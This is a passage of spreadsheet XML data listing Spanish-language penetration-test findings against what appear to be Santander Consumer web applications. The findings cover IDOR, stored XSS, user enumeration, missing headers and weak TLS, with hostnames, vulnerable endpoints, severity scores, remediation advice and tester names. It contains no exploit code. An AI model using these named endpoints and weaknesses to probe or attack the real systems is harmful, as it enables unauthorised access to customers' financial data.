    <s v="Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que inició _x000a_la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De esta manera, _x000a_un atacante podría obtener más información sobre el equipo remoto, por ejemplo la dirección IP del _x000a_mismo. _x000a_Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado como _x000a_proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración de datos _x000a_vía DNS. En ambos casos la dirección del Servidor DNS del atacante permanece oculta y se mostraría _x000a_la dirección IP del servidor afectado como originaria del ataque."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Alexander Parra"/>
  </r>
  <r>
    <n v="287"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-68f73b944f1323618c186787"/>
    <s v="SCO-25-CNMPO-012-AP-001"/>
    <x v="9"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.2"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-21T00:00:00"/>
    <n v="245"/>
    <d v="2026-01-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El identificador de sesión almacenado en la cookie es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript o ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, si existen en el aplicativo vulnerabilidades de tipo _x000a_Cross Site Scripting, un atacante podría usurpar el identificador de sesión del usuario con la finalidad  de impersonar al usuario en el aplicativo."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un _x000a_atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos _x000a_dentro de la aplicación."/>
    <s v="Te recomienda proteger los identificadores de sesión, almacenados a través de las cookies, _x000a_mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al _x000a_identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). _x000a_La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="288"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <m/>
    <s v="SCO-25-CNMPO-010-AP-001"/>
    <x v="32"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2026-02-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad asociada al método TRACE sucede cuando un servidor web permite su utilización,  lo que puede ser explotado por atacantes para llevar a cabo ataques de tipo Cross Site Tracing  (XST). Este método permite que un atacante envíe solicitudes a un servidor y obtenga información sensible, como cookies de sesión, mediante el eco de las solicitudes HTTP. La disponibilidad del método TRACE puede comprometer la seguridad de las aplicaciones web, exponiendo a la organización a riesgos de suplantación de identidad y acceso no autorizado a datos confidenciales. Se recomienda deshabilitar esta función en los servidores web con el fin de mitigar el riesgo _x000a_asociado."/>
    <s v="Se recomienda deshabilitar el método TRACE en todos los servidores web para prevenir la _x000a_explotación de esta vulnerabilidad y proteger la información sensible de posibles ataques, como el _x000a_Cross Site Tracing (XST)."/>
    <s v="El riesgo asociado al método TRACE radica en la potencial explotación por parte de atacantes, _x000a_quienes pueden acceder a información sensible y comprometer la seguridad de las aplicaciones web _x000a_a través de ataques de tipo Cross Site Tracing."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="289"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-68f1f46b4f1323618c17c18a"/>
    <s v="SCO-25-CNMPO-008-AP-001"/>
    <x v="82"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="6.5"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com_x000a_/MazdaDirectCredit/send-code-username"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2026-01-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación debe garantizar que únicamente se puedan ingresar datos coherentes para la lógica  de negocio en la propia aplicación. Así mismo, también se ha de realizar una validación de este tipo de lógica directamente en el lado del servidor para garantizar que un usuario malintencionado no haga uso de proxies intermedios para manipular estos datos para evadir las restricciones impuestas en el front-end, cuando esta información se encuentra en tránsito._x000a_Las vulnerabilidades relacionadas con la validación de lógica de negocio son únicas ya que son específicas de cada aplicación debido a que tratan de modificar los datos lógicos que la aplicación acepta para su correcto funcionamiento.En este caso particular se ha conseguido modificar el rate de intereses en el documento de solicitud del crédito"/>
    <s v="Tanto el front-end como el back-end de la aplicación deben verificar y validar que los datos _x000a_introducidos por los usuarios cumplen con la lógica de negocio de cada funcionalidad de la aplicación _x000a_y aplicar las restricciones pertinentes dependiendo de los tipos de datos que espera la aplicación"/>
    <s v="Un atacante puede hacer que una funcionalidad de la aplicación puede alterar su funcionamiento o _x000a_forzar a que se comporte de una manera inesperada. De esta manera es posible evadir ciertas _x000a_restricciones de lógica de negocio impuestas por la aplicación, o sobrepasar los límites impuestos _x000a_por la misma."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="290"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-68f1f41b4f1323618c17c189"/>
    <s v="SCO-25-CNMPO-008-AP-002"/>
    <x v="15"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com_x000a_/MazdaDirectCredit/send-code-username"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2026-01-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el análisis de seguridad se identificó una vulnerabilidad que permite la enumeración de  usuarios en la funcionalidad de recuperación de contraseña. El sistema presenta mensajes o  comportamientos diferenciados al ingresar un usuario o correo existente frente a uno inexistente, permitiendo a un atacante determinar qué cuentas están registradas en la aplicación. Esta exposición de información puede facilitar ataques posteriores de fuerza bruta o ingeniería social al revelar usuarios válidos del sistema."/>
    <s v="Se recomienda que el aplicativo no permita proporcionar un listado de usuarios presentes en el _x000a_sistema a roles que no sean administrativos. Así mismo, se recomienda que el mecanismo de _x000a_autenticación no proporcione evidencias que permitan discernir si el usuario introducido está dado _x000a_de alta, o no, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de _x000a_respuesta de la aplicación. Siendo un mensaje genérico de acceso incorrecto la mejor opción en _x000a_estos casos."/>
    <s v="Esta vulnerabilidad podría ser utilizada por un atacante para intentar obtener un listado de los _x000a_usuarios del sistema. Posteriormente, podría utilizar dicha información para planificar y generar _x000a_ataques de mayor impacto en el aplicativo como, por ejemplo, ataques de averiguación de _x000a_contraseñas, ataques de phishing, ataques de fuerza bruta o &quot;password spraying&quot; sobre las _x000a_contraseñas de los usuarios existentes en el sistema con la finalidad de obtener acceso a alguna _x000a_cuenta de usuario o administrador."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="291"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-68f212e24f1323618c17c18c"/>
    <s v="SCO-25-CNMPO-008-AP-003"/>
    <x v="7"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.5999999999999996"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com_x000a_/MazdaDirectCredit/send-code-username"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2026-01-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha identificado que JasperReports en versiones anteriores a la 8.0.4 contiene una vulnerabilidad  pública con el CVE-2024-3326 de carácter crítico que permite el compromiso del equipo. No se ha encontrado exploit’s públicos ni la forma de explotarlo, pero partiendo de la criticidad de la misma debe tenerse en cuenta y actualizar el software utilizado."/>
    <s v="Se recomienda utilizar versiones actualizadas del software utilizado por la aplicación y/o _x000a_infraestructura. En caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas _x000a_para la versión utilizada se recomienda instalar los parches de seguridad específicos que pongan en _x000a_riesgo la seguridad del sistema."/>
    <s v="Un atacante podría identificar el software utilizado por la aplicación con la finalidad de explotar _x000a_alguna vulnerabilidad conocida para tomar el control del sistema."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="292"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SCO-25-CNMPO-008-AP-004"/>
    <x v="47"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com_x000a_/MazdaDirectCredit/"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2026-02-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los recursos  JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la  carga de scripts en la página."/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una _x000a_vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún sistema _x000a_de protección que mitigue su impacto. _x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies _x000a_y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y _x000a_observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e _x000a_incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una _x000a_lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security_x0002_Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se _x000a_trata de una versión antigua y no es necesario configurarla). _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_Content-Security-Policy: default-src 'self' *.trusted.com "/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="293"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SCO-25-CNMPO-008-AP-005"/>
    <x v="106"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com_x000a_/MazdaDirectCredit/send-code-username"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2026-02-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no presenta ningún tipo de protección contra ataques de automatización de peticiones  HTTP. De esta manera, un atacante podría automatizar la realización de numerosas peticiones sobre algunos parámetros de entrada de la aplicación con el objetivo de averiguar, mediante fuerza bruta, información de la misma como pudieran ser, nombres de usuario, credenciales, identificadores de usuario, etc."/>
    <s v="Se recomienda implementar un sistema que impida la automatización de peticiones como, por _x000a_ejemplo, un sistema de bloqueo por dirección IP ante un número de peticiones elevado en un _x000a_tiempo definido o un sistema tipo CAPTCHA, que se le presente al usuario después de un número _x000a_de intentos de averiguación del dato. Este umbral ha de ser ajustado dependiendo del tipo de _x000a_aplicación y la lógica de la misma, por ejemplo, mostrar el sistema CAPTCHA cuando se exceda de _x000a_5 intentos de averiguación en menos de 1 minuto."/>
    <s v="De no bloquear los ataques automatizados de fuerza bruta, un atacante podría llevar a cabo con _x000a_éxito la obtención de nombres de usuario de la aplicación, correos electrónicos válidos e incluso _x000a_averiguar credenciales de un usuario legítimo de la aplicación."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="294"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SCO-25-CNMPO-008-AP-006"/>
    <x v="45"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.2"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com_x000a_/MazdaDirectCredit/login"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2026-02-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de la aplicación y/o framework de  programación utilizada para sustentar a la propia aplicación, así como versión. Esta información podría ser utilizada por un atacante con el objetivo de  recabar información para ataques futuros. normalmente este tipo de información se puede encontrar en las cabeceras HTTP de respuesta del servidor o en alguna página de error o por defecto del aplicativo."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al _x000a_software/framework y versión utilizada para desarrollar la propia aplicación. Para ello es necesario _x000a_eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen _x000a_este tipo de información."/>
    <s v="Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo permite a _x000a_un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como _x000a_generar ataques más elaborados contra la plataforma."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="295"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CRM Hubspot"/>
    <m/>
    <s v="SCO-25-CNMPO-017-AP-001"/>
    <x v="119"/>
    <m/>
    <x v="2"/>
    <s v="Critical"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="https://api.hubapi.com"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2025-11-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El aplicativo no realiza una correcta comprobación del acceso a los recursos del usuario en el Backend, pudiendo acceder un usuario de manera directa a información no legítima modificando el identificador que referencia al objeto que muestra la información accesible. _x000a__x000a_En este caso particular, un usuario puede acceder de manera directa a los datos y contenido de tickets creados a través de la funcionalidad API modificando el identificador _x000a_https://api.hubapi.com/crm/v3/objects/tickets/{id_ticket}?archived=false"/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para _x000a_acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene _x000a_privilegios de acceso a la información consultada."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo _x000a_directamente modificando el valor de un parámetro utilizado para apuntar directamente a un _x000a_objeto. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros _x000a_usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de _x000a_manera previa. "/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="296"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CRM Hubspot"/>
    <s v="MAN-690b1a37da6d35412ab651a2"/>
    <s v="SCO-25-CNMPO-017-AP-002"/>
    <x v="120"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <n v="8"/>
    <m/>
    <m/>
    <s v="https://api.hubapi.com/crm/v3/objetcs/tickets"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2025-12-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría _x000a_almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes _x000a_acciones:_x000a_• Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario _x000a_que, normalmente, se encuentra almacenado a través de una cookie._x000a_• Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible._x000a_• Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar _x000a_vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. _x000a_Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el _x000a_sistema de la víctima._x000a_• Ejecución de acciones de forma &quot;transparente&quot; para el usuario: Interactuar con la aplicación y _x000a_realizar acciones sin el conocimiento del usuario."/>
    <s v="Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría _x000a_almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes _x000a_acciones:_x000a_• Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario _x000a_que, normalmente, se encuentra almacenado a través de una cookie._x000a_• Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible._x000a_• Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar _x000a_vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. _x000a_Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el _x000a_sistema de la víctima."/>
    <s v="Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por _x000a_los usuarios, de forma que se valide adecuadamente la información transmitida a través de los _x000a_mismos. _x000a_Existen dos estrategias generales para implantar este filtro: _x000a_•Filtrado de lista blanca: Se valida la información recibida en función de la información esperada. _x000a_•Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades _x000a_HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código _x000a_JavaScript. Esta lista de caracteres podría ser “’”, “&lt;”, “&gt;”, “)”, “(“, “”” y la cadena “script”. _x000a_De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas _x000a_ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga _x000a_una complejidad alta, se recomienda utilizar una estrategia basada en listas negras. _x000a_Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que _x000a_el navegador del usuario interprete código JavaScript debido a una inyección de código, una _x000a_posibilidad sería renderizar caracteres especiales como HTML Entities."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="297"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <m/>
    <s v="SCO-25-CNMPA-016-CO-001 "/>
    <x v="34"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/_x000a_credito-vehiculo-relacional-90-dias"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2026-03-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo &quot;gzip&quot; o &quot;DEFLATE&quot;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
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. _x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una _x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite una _x000a_mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de _x000a_rendimiento en las solicitudes afectadas. _x000a_A continuación, se muestra como se deshabilita la compresión HTTP para Apache y NGINX: _x000a_Deshabilitar compresión en Apache: _x000a_●Deshabilite el módulo mod_deflate utilizando el siguiente comando: _x000a_ $ sudo a2dismod deflate _x000a_●Reinicie el servidor: _x000a_ $ sudo /etc/init.d/apache2 restart _x000a_Deshabilitar compresión en NGINX: _x000a_●Establezca la configuración del host con la opción gzip en off: _x000a_ server { _x000a_ server_name www.example.com; _x000a_ listen 443 ssl http2; _x000a_ gzip off; _x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el navegador _x000a_del cliente y el servidor, y tener acceso a la información transmitida entre ambos a través del canal _x000a_de comunicaciones (datos personales, credenciales de usuario, identificadores de sesión, etc.)."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="298"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <m/>
    <s v="SCO-25-CNMPA-016-CO-002"/>
    <x v="121"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/_x000a_credito-vehiculo-relacional-90-dias"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2026-03-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por una _x000a_vulnerabilidad conocida como Lucky13. _x000a_Según se ha podido determinar el servidor utiliza cifrados CBC sobre TLS, lo que permitiría a un  atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque  conocido como Padding de Oracle (POODLE). _x000a_Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-Block_x0002_Chaining) son potencialmente vulnerables a este tipo ataques. _x000a_CVEs Asociados: _x000a_•CVE-2013-0169"/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y _x000a_eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar _x000a_todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen _x000a_corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la _x000a_vulnerabilidad corregida. _x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien _x000a_descargando la última versión del siguiente enlace: _x000a_•https://www.openssl.org/source/"/>
    <s v="El protocolo TLS v1.1 y v1.2 y el protocolo DTLS v1.0 y v1.2, tal como se utiliza en OpenSSL, OpenJDK, _x000a_PolarSSL, y otros productos, no considera adecuadamente ataques a un requisito de verificación _x000a_MAC durante el proceso de relleno CBC malformado, lo que permite a atacantes remotos realizar _x000a_ataques distintivos y los ataques de recuperación de texto plano a través del análisis estadístico de _x000a_los datos de tiempo de los paquetes transmitidos."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="299"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-690a34b3da6d35412ab62f1a"/>
    <s v="SCO-25-CNMPA-015-AP-001"/>
    <x v="38"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.4"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2026-02-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un  atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el  propio atacante. Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando  al aplicativo a solicitar un recurso en el dominio controlado por el atacante."/>
    <s v="Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para _x000a_que no se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el _x000a_servidor afectado para que utilice un servidor DNS interno o de la DMZ."/>
    <s v="Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que _x000a_inició la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De _x000a_esta manera, un atacante podría obtener más información sobre el equipo remoto, por _x000a_ejemplo, la dirección IP de este. _x000a_Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado _x000a_como proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración _x000a_de datos vía DNS. En ambos casos la dirección del Servidor DNS del atacante permanece oculta _x000a_y se mostraría la dirección IP del servidor afectado como originaria del ataque."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="300"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <s v="SCO-25-CNMPA-015-AP-002"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2026-03-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="_x000a_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_x000a_Normalmente este tipo de información se puede encontrar en las cabeceras HTTP de respuesta del servidor o en alguna página de error o por defecto del aplicativo._x000a_Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor  revelan información interna acerca del tipo de servidor y versión de este, así como información  de la infraestructura interna de la aplicación"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de _x000a_servidor y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las _x000a_cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen este _x000a_tipo de información."/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, _x000a_permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las _x000a_mismas, así como generar ataques más elaborados contra la plataforma."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="301"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <s v="SCO-25-CNMPA-015-AP-003"/>
    <x v="47"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2026-03-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los  recursos JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la carga de scripts en la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación _x000a_web y observar los recursos que utiliza la misma, si son locales o provienen de algún dominio _x000a_externo, e incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a _x000a_actuar como una lista blanca para los recursos JavaScript que pueden ser cargados en la _x000a_aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security_x0002_Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero _x000a_se trata de una versión antigua y no es necesario configurarla). _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_•Content-Security-Policy: default-src 'self' *.trusted.com _x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por _x000a_ejemplo: _x000a_•&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child_x0002_src 'none';&quot;&gt; _x000a_Para obtener una referencia completa acerca de todas las directivas &quot;Content Security Policy&quot; _x000a_se recomienda visitar los siguientes enlaces: _x000a_•https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP _x000a_•https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice _x000a_una vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse _x000a_ningún sistema de protección que mitigue su impacto. _x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, _x000a_cookies y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="302"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <s v="SCO-25-CNMPA-015-AP-004"/>
    <x v="122"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7"/>
    <m/>
    <m/>
